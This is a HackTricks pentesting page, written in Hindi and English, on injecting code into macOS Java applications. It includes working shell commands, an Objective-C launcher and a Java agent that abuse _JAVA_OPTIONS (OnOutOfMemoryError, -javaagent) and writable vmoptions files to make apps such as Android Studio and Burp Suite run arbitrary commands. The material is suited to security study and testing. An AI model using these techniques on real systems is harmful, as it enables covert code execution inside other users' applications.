# macOS Java Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

अपने system में installed Java applications खोजें। यह देखा गया है कि **Info.plist** में Java apps में कुछ Java parameters होते हैं, जिनमें **`java.`** string शामिल होती है, इसलिए आप इसे search कर सकते हैं:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

env variable **`_JAVA_OPTIONS`** का उपयोग किसी java compiled app के execution में arbitrary java parameters inject करने के लिए किया जा सकता है:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
इसे एक नई process के रूप में execute करने के लिए, न कि current terminal की child के रूप में, आप इसका उपयोग कर सकते हैं:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
हालांकि, इससे executed app पर एक error trigger होगा; एक और अधिक stealth तरीका java agent बनाना और इसका उपयोग करना है:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Application से **different Java version** के साथ agent बनाने पर agent और application दोनों का execution crash हो सकता है

जहाँ agent हो सकता है:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Agent को compile करने के लिए चलाएँ:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` के साथ:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
और फिर env variable को export करें और java application को इस तरह चलाएँ:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions file

यह file Java के execute होने पर **Java params** की specification support करती है। आप Java params को बदलने और **process से arbitrary commands execute करवाने** के लिए पिछले कुछ tricks का उपयोग कर सकते हैं।\
इसके अलावा, यह file `include` directory के साथ अन्य files को भी **include** कर सकती है, इसलिए आप किसी included file को भी बदल सकते हैं।

इससे भी आगे, कुछ Java apps एक से अधिक `vmoptions` files **load** करेंगी।

Android Studio जैसे कुछ applications अपने **output में यह indicate करते हैं कि वे इन files को कहां ढूंढ रहे हैं**, जैसे:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
यदि वे ऐसा नहीं करते हैं, तो आप इसे आसानी से इस तरह जांच सकते हैं:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
ध्यान दें कि इस उदाहरण में Android Studio **`/Applications/Android Studio.app.vmoptions`** फ़ाइल को load करने का प्रयास कर रहा है, ऐसी जगह जहाँ **`admin` group का कोई भी user write access रखता है।**

{{#include ../../../banners/hacktricks-training.md}}
